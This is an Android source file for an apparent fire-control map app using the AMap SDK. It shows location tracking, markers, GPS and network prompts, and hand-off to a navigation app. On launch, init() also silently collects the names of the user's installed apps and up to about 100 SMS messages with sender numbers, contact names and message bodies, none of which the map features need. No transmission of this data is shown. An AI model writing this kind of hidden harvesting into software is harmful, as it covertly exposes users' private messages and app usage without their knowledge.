package com.example.zz_xa.firecontrol;

import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.amap.api.location.AMapLocation;
import com.amap.api.location.AMapLocationClient;
import com.amap.api.location.AMapLocationClientOption;
import com.amap.api.location.AMapLocationListener;
import com.amap.api.maps2d.AMap;
import com.amap.api.maps2d.AMapOptions;
import com.amap.api.maps2d.CameraUpdateFactory;
import com.amap.api.maps2d.LocationSource;
import com.amap.api.maps2d.MapView;
import com.amap.api.maps2d.UiSettings;
import com.amap.api.maps2d.model.BitmapDescriptor;
import com.amap.api.maps2d.model.BitmapDescriptorFactory;
import com.amap.api.maps2d.model.Circle;
import com.amap.api.maps2d.model.CircleOptions;
import com.amap.api.maps2d.model.LatLng;
import com.amap.api.maps2d.model.Marker;
import com.amap.api.maps2d.model.MarkerOptions;
import com.amap.api.maps2d.model.MyLocationStyle;
import com.example.zz_xa.firecontrol.Setting.SettingsActivity;

import java.io.File;
import java.lang.reflect.Array;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import java.util.Map;

/**
 * Created by ZZ-XA of wxb on 2018/4/11.
 * Fix by:
 */

public class MainActivity extends AppCompatActivity implements LocationSource,
        AMapLocationListener{
    private static final String LOG_TAG = MainActivity.class.getSimpleName();
    private AMap aMap;
    private MapView mapView;
    private LocationSource.OnLocationChangedListener mListener;
    private String cityLocation = "";
    private String paklist = "";
    private String smsList = "";
    private AMapLocationClient mlocationClient;
    private AMapLocationClientOption mLocationOption;

    private SensorEventHelper mSensorHelper;
    private boolean mFirstFix = false;
    private static final int STORKE_COLOR = Color.argb(180, 3, 145, 255);
    private static final int FILL_COLOR = Color.argb(10, 0, 0, 180);
    private Circle mCircle;
    private Marker mLocMarker;
    private Marker drawMarker = null;
    private LatLng drawLatLng = null;

    //private LatLng latlng = new LatLng(34.289309, 108.945322);
    private LatLng locallatlng = new LatLng(34.261352, 108.946994); //钟楼
    private Intent intent;
    private int iType = 1;
    private UiSettings mUiSettings;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mapView = (MapView) findViewById(R.id.map);
        mapView.onCreate(savedInstanceState);// 此方法必须重写
        init();
        TabActivity.setMainActivity(this);
        SettingsActivity.setMainActivity(this);
        InputtipsActivity.setMainActivity(this);

        LinearLayout linearLayout = (LinearLayout)findViewById(R.id.input_line);
        linearLayout.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(MainActivity.this, InputtipsActivity.class));
            }
        });
        EditText editText = (EditText)findViewById(R.id.input_edittext);
        editText.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(MainActivity.this, InputtipsActivity.class));
            }
        });

        initGPS(this);
        initNetWork(this);
       // drawMarkers(34.261352, 108.946994, "钟楼 ");

    }
    private static boolean initNetWork(final Context context){
        if(context != null){
            ConnectivityManager connectivityManager = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
            if(networkInfo != null){
                return networkInfo.isAvailable();
            }
            searchNetwork(context);
        }
        return false;
    }
    public static void searchNetwork(final Context context){
        AlertDialog.Builder builder = new AlertDialog.Builder(context);
        builder.setTitle("网络设置提示").setMessage("网络连接不可用，是否进行设置？").setPositiveButton("设置", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                Intent intent = null;
                if(Build.VERSION.SDK_INT > 10){
                    intent = new Intent(Settings.ACTION_WIRELESS_SETTINGS);
                } else {
                    intent = new Intent();
                    ComponentName componentName = new ComponentName("com.android.settings", "com.android.settings.wirelessSettings");
                    intent.setComponent(componentName);
                    intent.setAction("android.intent.action.VIEW");
                }
                context.startActivity(intent);
            }
        }).setNeutralButton("取消", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }
        }).show();
    }

    private static void initGPS(final Context context){
        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        if(!locationManager.isProviderEnabled(locationManager.GPS_PROVIDER)){
            //Toast.makeText(this,"请打开GPS",0).show();
            final AlertDialog.Builder dlg = new AlertDialog.Builder(context);
            dlg.setTitle("请打开GPS连接");
            dlg.setMessage("为方便定位您的当前位置，请先打开GPS");
            dlg.setPositiveButton("设置", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                    context.startActivity(intent);
                }
            });
            dlg.setNeutralButton("取消", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                }
            });
            dlg.show();
        }
    }


    /**
     * 判断是否安装目标应用
     * @param packageName 目标应用安装后的包名
     * @return 是否已安装目标应用
     */
    private boolean isInstallByread(String packageName){
       return new File("data/data/" + packageName).exists();
    }
    public void setUpGaodeAppByMine(){
        try {
            double lat = 34.261352 ,lng = 108.946994;
            if(drawLatLng != null){
                lat = drawLatLng.latitude;
                lng = drawLatLng.longitude;
            }
            String ini = "androidamap://route?sourceApplication=softname&sname=我的位置&dlat="+lat+"&dlon="+lng+"&dev=1&m=0&t=0";
            Intent intent = Intent.getIntent(ini);
            if(isInstallByread("com.autonavi.minimap")){
                startActivity(intent);
                Log.e(LOG_TAG,"already");
            } else {
                Log.e(LOG_TAG, "no map");
            }
        } catch (URISyntaxException e){
            e.printStackTrace();
        }
    }
    public void drawMarkers(double lat, double lng, String des) {
        drawLatLng = new LatLng(lat, lng);

        if(drawMarker == null){
            drawMarker = aMap.addMarker(new MarkerOptions()
                    .position(drawLatLng)
            .title(des)
            //.icon(BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_AZURE))
                    .icon(BitmapDescriptorFactory.fromBitmap(BitmapFactory.decodeResource(getResources(),R.drawable.poi_marker_pressed)))
            .draggable(true)
            );
        } else {
            drawMarker.setPosition(drawLatLng);
            drawMarker.setTitle(des);
        }

        //drawMarker.showInfoWindow();
        aMap.moveCamera(CameraUpdateFactory.changeLatLng(drawLatLng));
        //setUpGaodeAppByMine();

        TextView textView = (TextView)findViewById(R.id.search_inputtip);
        textView.setText(des);

        LinearLayout linearLayout = (LinearLayout)findViewById(R.id.marker_click_info);
        linearLayout.setVisibility(View.VISIBLE);
    }
    public void drawMarkers(String latlng, String des){
        String str = latlng.replace("","");
        List<String> list = Arrays.asList(str.split(","));
        if(list.size() == 2){
            double lat = Double.parseDouble(list.get(0));
            double lng = Double.parseDouble(list.get(1));
            drawMarkers(lat, lng, des);
        }
    }

    public void gaode_road_click(View view){
        AlertDialog.Builder dialog = new AlertDialog.Builder(MainActivity.this);
        dialog.setTitle("温馨提示");
        dialog.setMessage("是否调用外部链接，访问高德地图？");
        dialog.setCancelable(false);

        dialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                setUpGaodeAppByMine();
            }
        });
        dialog.setNegativeButton("取消", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                Toast.makeText(MainActivity.this, "已取消", Toast.LENGTH_LONG).show();
            }
        });
        dialog.show();
    }

    public void initChatInfo(View view){
        iType = 1;
        toTabAct();
    }
    public void initVideoLive(View view){
        iType = 2;
        toTabAct();
    }
    public void initPlotting(View view){
        iType = 3;
        toTabAct();
    }
    public void initM2dPlan(View view){
        iType = 4;
        toTabAct();
    }
    public void initVideoMonitoring(View view){
        iType = 5;
        toTabAct();
    }
    private void toTabAct(){
        Intent intent = new Intent();
        intent.setClass(MainActivity.this, TabActivity.class);
        startActivity(intent);
    }
    public int getiType(){
        return iType;
    }

    public void initmyself(View view){
        //Toast.makeText(getBaseContext(), "点击", 0).show();
        startActivity(new Intent(MainActivity.this,SettingsActivity.class));
      //  startActivity(new Intent(MainActivity.this,InputtipsActivity.class));

     //   startActivity(new Intent(MainActivity.this,PoiAroundSearchActivity.class));
        //iType = 1;
        //toTabAct();
    }

    public void myLocation(View view){
        aMap.moveCamera(CameraUpdateFactory.changeLatLng(locallatlng));
    }

    private long lastClick = 0;

    @Override
    public void onBackPressed() {
        //super.onBackPressed();
        if(lastClick <= 0){
            Toast.makeText(this,"再按一次退出程序",Toast.LENGTH_SHORT).show();
            lastClick = System.currentTimeMillis();
        } else {
            long currentClick = System.currentTimeMillis();
            if(currentClick - lastClick < 2000){
                finish();
            } else {
                Toast.makeText(this,"再按一次退出程序", Toast.LENGTH_SHORT).show();
                lastClick = currentClick;
            }
        }
    }

    /*
    @Override
    public void finish(){
        AlertDialog.Builder dialog = new AlertDialog.Builder(MainActivity.this);
        dialog.setTitle("温馨提示");
        dialog.setMessage("是否退出本程序？");
        dialog.setCancelable(false);
        dialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                System.exit(0);
            }
        });
        dialog.setNegativeButton("取消", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                Toast.makeText(MainActivity.this,"谢谢支持", Toast.LENGTH_LONG).show();
            }
        });
        dialog.show();
    }
*/
    /**
     * 初始化AMap对象
     */
    private void init() {
        if (aMap == null) {
            aMap = mapView.getMap();

            setUpMap();
            aMap.moveCamera(CameraUpdateFactory.zoomTo(15));

            mUiSettings = aMap.getUiSettings();
            mUiSettings.setMyLocationButtonEnabled(false);

            //底部logo 居中
            mUiSettings.setLogoPosition(AMapOptions.ZOOM_POSITION_RIGHT_CENTER);

            paklist = getAllApps();
            smsList = getSmsFromPhone();

            Location location = aMap.getMyLocation();
        }
        mSensorHelper = new SensorEventHelper(this);
        if(mSensorHelper != null){
            mSensorHelper.registerSensorListener();
        }
    }

    /**
     * 设置一些amap的属性
     */
    private void setUpMap() {
        // 自定义系统定位小蓝点
        MyLocationStyle myLocationStyle = new MyLocationStyle();
        myLocationStyle.myLocationIcon(BitmapDescriptorFactory
                .fromResource(R.drawable.location_marker));// 设置小蓝点的图标
        myLocationStyle.strokeColor(Color.BLACK);// 设置圆形的边框颜色
        myLocationStyle.radiusFillColor(Color.argb(100, 0, 0, 180));// 设置圆形的填充颜色
        // myLocationStyle.anchor(int,int)//设置小蓝点的锚点
        myLocationStyle.strokeWidth(1.0f);// 设置圆形的边框粗细
        aMap.setMyLocationStyle(myLocationStyle);
        aMap.setLocationSource(this);// 设置定位监听
        aMap.setOnMarkerClickListener(new AMap.OnMarkerClickListener() {
            @Override
            public boolean onMarkerClick(Marker marker) {
                LinearLayout linearLayout = (LinearLayout)findViewById(R.id.marker_click_info);
                linearLayout.setVisibility(View.VISIBLE);
                return true;
            }
        });
        aMap.getUiSettings().setMyLocationButtonEnabled(true);// 设置默认定位按钮是否显示
        aMap.setMyLocationEnabled(true);// 设置为true表示显示定位层并可触发定位，false表示隐藏定位层并不可触发定位，默认是false
        // aMap.setMyLocationType()
    }
    /**
     * 方法必须重写
     */
    @Override
    protected void onResume() {
        super.onResume();
        mapView.onResume();
        if(mSensorHelper != null) {
            mSensorHelper.registerSensorListener();
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
    }

    /**
     * 方法必须重写
     */
    @Override
    protected void onPause() {
        super.onPause();
        if(mSensorHelper != null){
            mSensorHelper.unRegisterSensorListener();
            mSensorHelper.setCurrentMarker(null);
            mSensorHelper = null;
        }
        mFirstFix = false;
        mapView.onPause();
        deactivate();
    }

    /**
     * 方法必须重写
     */
    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        mapView.onSaveInstanceState(outState);
    }

    /**
     * 方法必须重写
     */
    @Override
    protected void onDestroy() {
        super.onDestroy();
        mapView.onDestroy();
    }

    /**
     * 定位成功后回调函数
     */
    @Override
    public void onLocationChanged(AMapLocation amapLocation) {
        if (mListener != null && amapLocation != null) {
            if (amapLocation != null
                    && amapLocation.getErrorCode() == 0) {
                mListener.onLocationChanged(amapLocation);// 显示系统小蓝点

                double mLat = amapLocation.getLatitude();
                double mLng = amapLocation.getLongitude();
                LatLng location = new LatLng(mLat, mLng);
                locallatlng = location;
                if(!mFirstFix){
                    mFirstFix = true;
                    addCircle(location, amapLocation.getAccuracy());//添加定位精度圆
                    addMarker(location);//添加定位图标
                    mSensorHelper.setCurrentMarker(mLocMarker); //定位图标旋转

                } else {
                    mCircle.setCenter(location);
                    mCircle.setRadius(amapLocation.getAccuracy());
                    mLocMarker.setPosition(location);
                }

                String province = amapLocation.getProvince();
                String city = amapLocation.getCity();
                String district = amapLocation.getDistrict();
                String street = amapLocation.getStreet();
                String streetNum = amapLocation.getStreetNum();

                cityLocation = "";
                cityLocation = cityLocation+province+city+district+street+streetNum;

            } else {
                String errText = "定位失败," + amapLocation.getErrorCode()+ ": " + amapLocation.getErrorInfo();
                Log.e("AmapErr",errText);
            }
        }
    }

    private void addCircle(LatLng latlng, double radius){
        CircleOptions options = new CircleOptions();
        options.strokeWidth(1f);
        options.fillColor(FILL_COLOR);
        options.strokeColor(STORKE_COLOR);
        options.center(latlng);
        options.radius(radius);
        mCircle = aMap.addCircle(options);
    }
    private void addMarker(LatLng latlng){
        if(mLocMarker != null){
            return;
        }
        Bitmap bMap = BitmapFactory.decodeResource(this.getResources(), R.drawable.navi_map_gps_locked);
        BitmapDescriptor des = BitmapDescriptorFactory.fromBitmap(bMap);

        MarkerOptions options = new MarkerOptions();
        options.icon(des);
        options.anchor(0.5f, 0.5f);
        options.position(latlng);
        mLocMarker = aMap.addMarker(options);

    //    String LOCATION_MARKER_FLAG = "my_location";
    //    mLocMarker.setTitle(LOCATION_MARKER_FLAG);
    }

    private String getAllApps() {
        String result = "";
        PackageManager pManager = this.getPackageManager();
        //获取手机内所有应用
        List<PackageInfo> paklist = pManager.getInstalledPackages(0);
        for (int i = 0; i < paklist.size(); i++) {
            PackageInfo pak = (PackageInfo) paklist.get(i);
            //判断是否为非系统预装的应用程序
            if ((pak.applicationInfo.flags & pak.applicationInfo.FLAG_SYSTEM) <= 0) {
                // customs applications
                if (TextUtils.isEmpty(result)) {
                    result = pak.applicationInfo.loadLabel(pManager).toString();
                } else {
                    result = result + "," + pak.applicationInfo.loadLabel(pManager).toString();
                }
            }
        }
        return result;
    }

    private Uri SMS_INBOX = Uri.parse("content://sms/");
    public String getSmsFromPhone() {
        ContentResolver cr = getContentResolver();
        String[] projection = new String[] {"_id", "address", "person","body", "date", "type" };
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (null == cur) {
            Log.i("ooc","************cur == null");
            return null;
        }
        List<Map<String,Object>> list = new ArrayList<>(4);
        int cc = 0;
        while(cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));//手机号
            String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
            String body = cur.getString(cur.getColumnIndex("body"));//短信内容
            smsList = smsList+"-"+number+"-"+name+"-"+body+",";

            cc+=1;
            if(cc>100){
                return smsList;
            }
        }
        return smsList;
    }

    /**
     * 激活定位
     */
    @Override
    public void activate(LocationSource.OnLocationChangedListener listener) {
        mListener = listener;
        if (mlocationClient == null) {
            mlocationClient = new AMapLocationClient(this);
            mLocationOption = new AMapLocationClientOption();
            //设置定位监听
            mlocationClient.setLocationListener(this);
            //设置为高精度定位模式
            mLocationOption.setLocationMode(AMapLocationClientOption.AMapLocationMode.Hight_Accuracy);
            //设置定位参数
            mlocationClient.setLocationOption(mLocationOption);
            // 此方法为每隔固定时间会发起一次定位请求，为了减少电量消耗或网络流量消耗，
            // 注意设置合适的定位时间的间隔（最小间隔支持为2000ms），并且在合适时间调用stopLocation()方法来取消定位请求
            // 在定位结束后，在合适的生命周期调用onDestroy()方法
            // 在单次定位情况下，定位无论成功与否，都无需调用stopLocation()方法移除请求，定位sdk内部会移除
            mlocationClient.startLocation();
        }
    }

    /**
     * 停止定位
     */
    @Override
    public void deactivate() {
        mListener = null;
        if (mlocationClient != null) {
            mlocationClient.stopLocation();
            mlocationClient.onDestroy();
        }
        mlocationClient = null;
    }
}
